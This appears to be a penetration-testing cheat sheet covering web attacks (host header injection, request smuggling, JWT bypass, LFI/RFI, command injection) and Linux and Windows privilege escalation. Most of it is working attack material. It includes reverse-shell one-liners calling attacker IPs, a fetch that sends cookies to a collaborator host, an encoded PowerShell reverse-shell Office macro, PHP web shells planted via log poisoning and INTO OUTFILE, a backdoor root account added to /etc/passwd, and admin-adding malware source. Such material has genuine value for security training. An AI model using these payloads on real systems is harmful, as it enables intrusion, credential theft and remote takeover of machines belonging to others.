  {"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

  ```
- **GraphQL Running a full introspection query (Removing the onOperation, onFragment, and onField directives from the query structure)**:
  ```graphql
   query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }

  ```
### Hashing Attacks
- **Hashing Example**:
  ```python
  import hashlib
  hash = hashlib.md5(b'password').hexdigest()
  ```

### Host Header Injection
- **Host Header Injection Example**:
  ```bash
  curl -H "Host: victim.com" http://target.com
  ```
- **Host Header Injection: Basic tricks**:
  ```bash
    Host: localhost					//to access /admin for example
  Host: Exploit-Server.com			//to get the password reset link
  
  Host: localhost
   Host: localhost
  
   Host: localhost
  Host: localhost
  
  
  GET https://URL/admin
  Host: normal
  
  GET @private-intranet/example
  Host: normal					//http://normal@private-intranet/example

  ```
- **Host Header Injection: Intruder basic lists**:
  ```bash
  # uncheck the option(Update the host header to match the target) in Intruder

  localhost
  127.0.0.1
  127.1
  localhost:6566
  localhost@localhost
  2130706433
  017700000001
  %6cocalhost
  &#x6cocalhost
  \u006Cocalhost
  ```
- **Host Header: Host override Header**:
  ```bash
  X-Host:
  X-Forwarded-Server:
  X-HTTP-Host-Override:
  Forwarded:

  ```
- **Host Header Exploit Server (Web cache poisoning via ambiguous requests)**:
  ```bash
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body:document.cookie
  });
  ```

### HTA (HTML Application)
- **HTA Example**:
  ```html
  <script src="mshta.exe" />
  ```
- **Generating HTA Reverse shell**:
  ```html
  sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta

  ```
- **HTA file to execute cmd.exe**:
  ```html
  <html>
  <body>
  
  <script>
  
    var c= 'cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
    
  </script>
  
  </body>
  </html>
  
  # Updated proof of concept
  <html>
  <head>
  
  <script>
  
    var c= 'cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
    
  </script>
  
  </head>
  <body>
  
  <script>
    
    self.close();
      
  </script>
    
  </body>
  </html>
  ```

### HTTP Header Attacks
- **HTTP Header Injection Example**:
  ```bash
  curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
  ```

### HTTP Request Smuggling
- **HTTP Request Smuggling most known tricks and attacks**:
  ```bash
  //Changing GET / Request to POST
  //Adding Teansfer-Encoding or Content-Length Header
  //duplicate the header
  
  
  
  //HTTP request smuggling, basic CL.TE vulnerability
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Connection: keep-alive
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 6
  Transfer-Encoding: chunked
  
  0
  
  G
  
  
  //HTTP request smuggling, basic TE.CL vulnerability
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-length: 4
  Transfer-Encoding: chunked
  
  5c
  GPOST / HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15
  
  x=1
  0
  
  //HTTP request smuggling, obfuscating the TE header
  //This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-length: 4
  Transfer-Encoding: chunked
  Transfer-encoding: cow
  
  5c
  GPOST / HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15
  
  x=1
  0
  
  //HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 35
  Transfer-Encoding: chunked
  
  0
  
  GET /404 HTTP/1.1
  X-Ignore: X
  
  //HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-length: 4
  Transfer-Encoding: chunked
  
  5e
  POST /404 HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15
  
  x=1
  0
  
  //Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 139
  Transfer-Encoding: chunked
  
  0
  
  GET /admin/delete?username=carlos HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 10
  
  x=
  
  
  
  //Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-length: 4
  Transfer-Encoding: chunked
  
  87
  GET /admin/delete?username=carlos HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15
  
  x=1
  0
  
  
  
  //Exploiting HTTP request smuggling to deliver reflected XSS
  
  POST / HTTP/1.1
  Host: YOUR-LAB-ID.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 150
  Transfer-Encoding: chunked
  
  0
  
  GET /post?postId=5 HTTP/1.1
  User-Agent: a"/><script>alert(1)</script>
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 5
  
  x=1
  ```

### Internet Relay Chat (IRC)
- **IRC Example**:
  ```bash
  irc://example.com/channel
  ```
- **Connection with random nickname**:
  ```bash
  user kali 0 * kali
  nick kali
  ```
- **list channels/Users**:
  ```bash
  list
  ```
- **join channel**:
  ```bash
  join #channelname
  ```
- **posting a message into the channel/user**:
  ```bash
  privmsg #channel-name hello
  privmsg user hello
  ```

### JSON Web Token (JWT)
- **JWT basic tricks**:
  ```bash
  // Change user to admin with the same signature(JWT authentication bypass via unverified signature)
  // Change alg parameter to none(JWT authentication bypass via flawed signature verification)
  // Crack the secret and rebuild the cookie (JWT authentication bypass via weak signing key)
  	hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
  //JWT Editor generate key and then embed a JWK via  JWT Attack to the header(JWT authentication bypass via jwk header injection)
  //JWT authentication bypass via jku header injection:
  			- Generate RSA JWT and add it to Exploit Server: 
  				{
     			 "keys": [
  					//Here
     				 ]
  				}	
  			- add jku param to the header: "jku": "https://exploit-0abb008004f147dbc0ca32a801f800ca.exploit-server.net/exploit"
  			- change the kid header and sign the JWT
  
  //JWT authentication bypass via kid header path traversal
  			- Generate JWT Assemteric key with k="AA==" /null Byte in base64
  			- In JWT Cookie change the kid value to ../../../../../../../dev/null
   			- Sign and send
  ```

### Local File Inclusion (LFI)
- **LFI Example**:
  ```bash
  curl http://example.com/index.php?page=../../etc/passwd
  ```
- **Log File Poisoning: Using Netcat to send a PHP payload**:
```bash
nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

- **Using the Poisoned Log File**:
```bash
curl http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```
- **Searching for Windows hosts file**:
```bash
curl http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
```

- **A Test Payload Using the Data Wrapper**:
```bash
curl http://10.11.0.22/menu.php?file=data:text/plain,hello%20world
```

- **A Sample LFI Payload Using the Data Wrapper**:
```bash
curl http://10.11.0.22/menu.php?file=data:text/plain,<?php%20echo%20shell_exec("dir")%20?>
```

- **LFI to RFI Example**:
```bash
# On the attacker side, set up the shell payload
<?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>

# Exploit
curl http://10.11.1.35/section.php?page=http://192.168.119.172/shell2.php
```

- **Search for Local SSH Private Keys**:
```bash
curl http://192.168.124.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
```

- **Directory Traversal Vulnerable Code Example**:
```php
# Vulnerable PHP code
if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
    error_reporting(E_ALL ^ E_WARNING);
    include  $_GET['show'] . $ext;
} else {
    echo 'You can select either one of these only';
}
```

- **Directory Traversal Exploit for the vulnerable code**:
```bash
curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
```
### Macros
- **Macro Example**:
  ```vba
  Sub MyMacro()
  
    CreateObject("Wscript.Shell").Run "cmd"
    
  End Sub

  ```
- **Macro that execute cmd.exe**:
  ```vba
  Sub AutoOpen()
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "cmd.exe /c calc.exe"
  End Sub
  ```
- **Macro that automatically execute cmd**:
  ```vba
   Sub AutoOpen()
  
    MyMacro
    
  End Sub
  
  Sub Document_Open()
  
    MyMacro
    
  End Sub
  
  Sub MyMacro()
  
    CreateObject("Wscript.Shell").Run "cmd"
    
  End Sub
  ```
- **Macro: invoking PowerShell to create a reverse shell**:
  ```vba
  Sub AutoOpen()
    MyMacro
  End Sub
  
  Sub Document_Open()
      MyMacro
  End Sub
  
  Sub MyMacro()
      Dim Str As String
      
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="

    CreateObject("Wscript.Shell").Run Str
    End Sub

  ```
- **Creating HTA payload with msfvenom**:
  ```bash
  sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
  ```
- **Python script to split Base64 encoded string**:
  ```bash
  str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

  n = 50
  
  for i in range(0, len(str), n):
  	print "Str = Str + " + '"' + str[i:i+n] + '"'
  ```
  
### Network File System (NFS)
- **NFS Example**:
  ```bash
  mount -t nfs target:/path /mnt
  ```
- **Using nmap to identify hosts that have portmapper/rpcbind running**:
  ```bash
  nmap -v -p 111 10.11.1.1-254
  ```
- **Querying rpcbind in order to get registered services**:
  ```bash
  nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
  ```
- **Running all NSE scripts for NFS**:
  ```bash
  nmap -p 111 --script nfs* 10.11.1.72
  ```
- **Using mount to access the NFS share in Kali**:
  ```bash
  mkdir home
  sudo mount -o nolock 10.11.1.72:/home ~/home/
  cd home/ && ls

  ```
- **Accessing protected file in the shared home as the pwn user**:
  ```bash
  cd home --> cat creds.txt  Output: cat: creds.txt: Permission denied
  sudo adduser pwn
  sudo sed -i -e 's/1001/1014/g' /etc/passwd
  cat /etc/passwd | grep pwn
  su pwn
  id
  cat creds.txt
  ```

### OS command injection
- **OS injection basic payloads**:
  ```bash
  storid=1 ; whomai
  storid= 1 | whoami
  email=x||ping+-c+10+127.0.0.1||
  email=||whoami>/var/www/images/output.txt||			//Blind OS command injection with output redirection
  email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
  email=x||curl+http://ehz2g0r2zgoirolnmagql5jaj1psdk19.oastify.com/?id=$(whoami) ||
  email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
  ```

### Other Vulnerabilities
- **Other Example**:
  ```bash
  curl -X DELETE http://example.com/resource
  ```

### phpMyAdmin
- **phpMyAdmin Example**:
  ```php
  http://example.com/phpmyadmin
  ```
- **Abusing the into outfile function in MySQL to write a php code to the target's webroot at http://127.0.0.1:8080/phpmyadmin/server_sql.php.**:
  ```php
  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
  ```

### Privilege Escalation Linux (LIN)
- **Privilege Escalation LIN most known tricks**:
  ```bash
  #useful links
  https://gtfobins.github.io/gtfobins/find/
  
  # Getting the version of the running operating system and architecture
  cat /etc/issue
  cat /etc/*-release
  uname -a
  
  #Enumerate IP-Adresses
  cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IP
  
  #Getting a list of running processes on Linux
  ps axu
  
  #Inspecting the cron log file
  grep "CRON" /var/log/cron.log
  
  #Listing the full TCP/IP configuration on all available adapters on Linux
  ip a
  
  #Printing the routes on Linux
  /sbin/route
  
  #checking the writable permissions on /etc/apt/apt.conf.d
  ls -ld /etc/apt/apt.conf.d
  
  
  #Listing all active network connections on Linux
  ss -anp
  
  
  #Writable Directory
  find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
  
  
  #discovering that this user can write to usr/local/bin.
  find / -writable -type d -prune -o -name /home/chloe -prune -o -name /var/lib/gitea 2>/dev/null
  
  # Listing all cron jobs on Linux
  ls -lah /etc/cron*
  cat /etc/crontab
  
  # Listing all installed packages on a Debian Linux operating system
  dpkg -l
  
  #Listing all world writable directories on Linux
  find / -writable -type d 2>/dev/null
  
  #Caps
  getcap -r / 2>/dev/null
  
  #Listing content of /etc/fstab and all mounted drives on Linux
  cat /etc/fstab
  mount
  
  #Listing all available drives using lsblk on Linux
  /bin/lsblk
  
  #Listing loaded drivers on Linux
  lsmod
  
  #Listing additional information about a module on Linux
  /sbin/modinfo libata
  
  # Searching for SUID files on Linux
  find / -perm -u=s -type f 2>/dev/null
  find / -type f -perm -4200 2>/dev/null
  
  #Tools
  #https://pentestmonkey.net/tools/audit/unix-privesc-check
  ./unix-privesc-check standard > output.txt
  
  #Escalating privileges by editing /etc/passwd
  openssl passwd evil -->Output: AK24fcSx2Il3I
  echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
  su root2 --> Root
  
  #Code-GCC Compile
  gcc 43418.c -o exploit
  
  #Process monitoring
  https://github.com/DominicBreuker/pspy/releases
  
  #Dumping Firefox Saved Passwords
  find / -type f -user elliot 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
  
  #SUID example
  $ ./get-list
  Which List do you want to open? [customers/employees]: employees;ls
  $ ./get-list
  Which List do you want to open? [customers/employees]: ../../etc/shadow #employees
  
  #df Example
  
  $ id
  uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
  $ df -h
  udev            1.9G     0  1.9G   0% /dev
  tmpfs           390M  1.9M  388M   1% /run
  /dev/sda5        20G  7.8G   11G  43% /
  
  $ debugfs /dev/sda5
  debugfs:  cd /root/.ssh
  debugfs:  cat id_rsa
  
  
  #Cron-Job Example:
  #The first thing we notice here is that the PATH variable is specified with a new directory added: /dev/shm.
  #We also see a cronjob listed in the crontab file that executes netstat as the root user every minute, along with other commands. We'll note that the full path (/usr/bin/netstat) is not specified for this binary; 
  #therefore, the system will search the PATH variable for the location of the binary.
  
  www-data@muddy:/$ cat /etc/crontab
  cat /etc/crontab
  ...
  SHELL=/bin/sh
  PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  ...
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  *  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
  ...
  www-data@muddy:/$
  
  www-data@muddy:/$ cd /dev/shm
  cd /dev/shm
  www-data@muddy:/dev/shm$ cat <<EOF>> ./netstat
  cat <<EOF>> ./netstat
  > #!/bin/bash
  #!/bin/bash
  > /bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
  /bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
  > EOF
  EOF
  www-data@muddy:/dev/shm$ chmod +x netstat
  chmod +x netstat
  www-data@muddy:/dev/shm$ 
  
  #Other Cron example:
  #As the service runs as root we can execute malicious commands via the apt package manager.
  #We begin by checking the writable permissions on /etc/apt/apt.conf.d:
  
  cat /etc/crontab
  
  SHELL=/bin/bash
  PATH=/sbin:/bin:/usr/sbin:/usr/bin
  MAILTO=root
  
  # For details see man 4 crontabs
  
  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name  command to be executed 
  
  * * * * * root apt-get update
  * * * * * root /root/run.sh
  
  -->
  ls -ld /etc/apt/apt.conf.d
  -rwxrwxrwx. 1 root root 1338 Apr 28 13:45 /etc/apt/apt.conf.d
  bash-4.2$
  -->
  echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <My-IP> 1234 >/tmp/f"};' > shell
  
  #Other Example:
  #Running pspy we see a cron running as root.
  2022/08/22 18:34:01 CMD: UID=0    PID=2147   | /bin/sh -c /bin/bash /usr/bin/clean-tmp.sh 
  2022/08/22 18:34:01 CMD: UID=0    PID=2149   | /bin/bash /usr/bin/clean-tmp.sh 
  jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
  #! /bin/bash
  find /dev/shm -type f -exec sh -c 'rm {}' \;
  jane@assignment:/tmp$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
  jane@assignment:/tmp$ bash -p
  bash-5.0# whoami
  root
  
  #Other Example:
  #To determine the privileges of the network group, we can use the find command.
  #We see that we have write access to the /etc/hosts file. We modify the IP address of localhost in the /etc/hosts file to our attacker IP.
  #we proceed to mount the share onto our attack machine.
  liam@lunar:~$ find / -xdev -group network 2>/dev/null
  /etc/hosts
  
  liam@lunar:~$ ls -la /etc/hosts
  -rw-rwxr-- 1 root network 36 Apr 29 20:40 /etc/hosts
  
  --> 
  liam@lunar:~$ cat /etc/hosts
  #127.0.0.1       localhost
  192.168.1.99    locahost
  
  -->
  ┌──(kali@kali)-[/tmp/]
  └─# sleep 60 && mount -t nfs 192.168.1.33:/srv/share /tmp/share
  
  ┌──(kali@kali)-[/tmp/]
  └─# cd share && ls -la
  
  drwxrwxrwx  2 root   root       4096 Apr 30 12:29 .
  drwxrwxrwt 15 root   root      20480 Apr 30 13:39 ..
  -rw-rw-rw-  1 nobody nogroup 1280255 Apr 30 12:28 web-backup.zip
  
  --> create the following bash.c 
  ┌──(kali@kali)-[/tmp]
  └─# nano bash.c
  #include <stdio.h>
  #include <stdlib.h>
  #include <sys/types.h>
  #include <unistd.h>
  
  int main()
  {
  setuid(0);
  system("/bin/bash");
  return 0;
  }
  
  -->
  ┌──(kali@kali)-[/tmp]
  └─# sudo cp bash share/
  
  ┌──(kali@kali)-[/tmp/share]
  └─# sudo chmod +s bash
  
  liam@lunar:/$ cd /srv/share/
  liam@lunar:/srv/share$ ./bash
  
  root@lunar:/srv/share# whoami
  root
  ```

### Privilege Escalation Windows (WIN)
- **Privilege Escalation WIN most known tricks**:
  ```powershell
  #Getting the version and architecture of the running operating system
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  
  #Querying the AlwaysInstalledElevated registry values on Windows
  reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
  reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
  
  
  #Getting OS Architecture using wmic
  wmic os get osarchitecture
  
  #Checking the Group Integrity Level
  whoami /groups
  
  #Attempting to change the password
  net user admin Ev!lpass
  
  #Using powershell to spawn a cmd.exe process with high integrity
  powershell.exe Start-Process cmd.exe -Verb runAs
  
  #Listing driver versions on Windows
  Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  
  #Listing loaded drivers on Windows
  PS > driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
  
  #Listing all drives available to mount on Windows
  mountvol
  
  #Checking for reboot and other privileges
  whoami /priv
  
  #Rebooting the machine
  shutdown /r /t 0
  
  #Listing all Unquoted Service Paths
  wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
  wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
  
  #Unquoted Service Paths: Other way
  for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
  	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
  		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
  	)
  )
  #To retrieve service accounts hash, we'll use a publicly available tool GMSAPasswordReader
  *Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe
  *Evil-WinRM* PS C:\Users\enox\Desktop> ./GMSAPasswordReader.exe --accountname svc_apache
  
  #Listing all installed drivers
  driverquery /v
  
  #Listing all writable files and directories in a specified target using PowerShell
  PS > Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
  
  #Listing all writable files and directories in a specified target
  accesschk.exe -uws "Everyone" "C:\Program Files"
  
  #Listing all installed security patches on Windows
  wmic qfe get Caption, Description, HotFixID, InstalledOn
  
  #Listing all installed applications installed on Windows
  wmic product get name, version, vendor
  wmic service get name,displayname,pathname,startmode
  wmic service get name,displayname,pathname,startmode | findstr /i "auto"
  
  #Getting services via wmic that are automatically started and non-standard
  wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
  
  #Listing running services on Windows using PowerShell
  Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
  
  #Listing all the scheduled tasks on Windows
  schtasks /query /fo LIST /v
  
  # icacls output for the ServiioService.exe service
  icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
  
  #Listing all the firewall rules on Windows
  netsh advfirewall firewall show rule name=all
  
  #Listing the current profile for the firewall on Windows
  netsh advfirewall show currentprofile
  
  #Listing all active network connections on the Windows operating system
  netstat -ano
  
  #Printing the routes on Windows
  route print
  
  #Listing the full TCP/IP configuration on all available adapters on Windows
  ipconfig /all
  
  #Getting a list of running processes on the operating system and matching services
  tasklist /SVC
  
  #Checking user permissions
  #PrintSpoofer v0.1 or Juicy Potato to get the root shell
  whoami /priv
  Output: SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
  .\PS.exe -i -c ".\nc.exe 192.168.119.156 80 -e cmd" --> shell
  
  
  #Tools
  #https://github.com/pentestmonkey/windows-privesc-check
  windows-privesc-check2.exe -h
  windows-privesc-check2.exe --dump -G
  
  #Tools
  #Checking the application manifest of fodhelper.exe using sigcheck.exe
  SysinternalsSuite --> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
  
  #Specific exploits:
  #whoami /priv
  #SeRestorePrivilege            Restore files and directories  Enabled
  wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
  *Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
  *Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./EnableSeRestorePrivilege.ps1
  move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
  move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
  $ rdesktop 192.168.120.91--> WIN+U
  
  
  #Tools
  #gcc for windows with
  mingw-w64.bat
  gcc --help
  
  
  #Code
  #adduser.c code
  #i686-w64-mingw32-gcc adduser.c -o adduser.exe
  
  #include <stdlib.h>
  
  int main ()
  {
    int i;
    
    i = system ("net user evil Ev!lpass /add");
    i = system ("net localgroup administrators evil /add");
    
    return 0;
  }
  
  #Code
  #Ping sweep internal network
  for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
  
  
  #Links:
  #XP
  C:\Documents and Settings\Administrator\Desktop\
  
  #Examples: Priveleges:
  #https://github.com/itm4n/FullPowers
  #From this resource, we find out that when a LOCAL SERVICE or NETWORK SERVICE is configured to run with a restricted set of privileges, permissions can be recovered by creating a scheduled task. 
  
  PS C:\wamp\www>whoami /priv
  whoami /priv
  
  PRIVILEGES INFORMATION
  ----------------------
  
  Privilege Name                Description                    State   
  ============================= ============================== ========
  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
  SeCreateGlobalPrivilege       Create global objects          Enabled 
  SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
  
  -->
  PS C:\wamp\www> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
  -->
  C:\Windows\system32>whoami /priv
  whoami /priv
  
  PRIVILEGES INFORMATION
  ----------------------
  
  Privilege Name                Description                        State   
  ============================= ================================== ========
  SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled
  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
  SeSystemtimePrivilege         Change the system time             Disabled
  SeAuditPrivilege              Generate security audits           Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
  SeCreateGlobalPrivilege       Create global objects              Enabled 
  SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
  SeTimeZonePrivilege           Change the time zone               Disabled
  
  C:\Windows\system32>
  
  -->
  C:\wamp\www>PrintSpoofer64.exe -i -c "cmd /c whoami"
  PrintSpoofer64.exe -i -c "cmd /c whoami"
  [+] Found privilege: SeImpersonatePrivilege
  [+] Named pipe listening...
  [+] CreateProcessAsUser() OK
  nt authority\system
  
  #PRIVE-Escalation with TFTP
  #We notice that the C://Backup/ directory is writeable.
  #According to this text file, TFTP.EXE is run every five minutes
  C:\>icacls Backup
  icacls Backup
  Backup BUILTIN\Users:(OI)(CI)(F)
         BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
  
  Successfully processed 1 files; Failed processing 0 files
  
  C:\>
  
  -->
  C:\>cd Backup && dir
  cd Backup && dir
   Volume in drive C has no label.
   Volume Serial Number is 6E11-8C59
  
   Directory of C:\Backup
  
  06/12/2020  07:45 AM    <DIR>          .
  06/12/2020  07:45 AM    <DIR>          ..
  06/12/2020  07:45 AM            11,304 backup.txt
  06/12/2020  07:45 AM                73 info.txt
  06/12/2020  07:45 AM            26,112 TFTP.EXE
                 3 File(s)         37,489 bytes
                 2 Dir(s)  28,603,658,240 bytes free
  
  C:\Backup>type info.txt
  type info.txt
  Run every 5 minutes:
  C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
  C:\Backup>
  
  -->
  C:\Backup>move evil.exe TFTP.EXE
  move evil.exe TFTP.EXE
          1 file(s) moved.
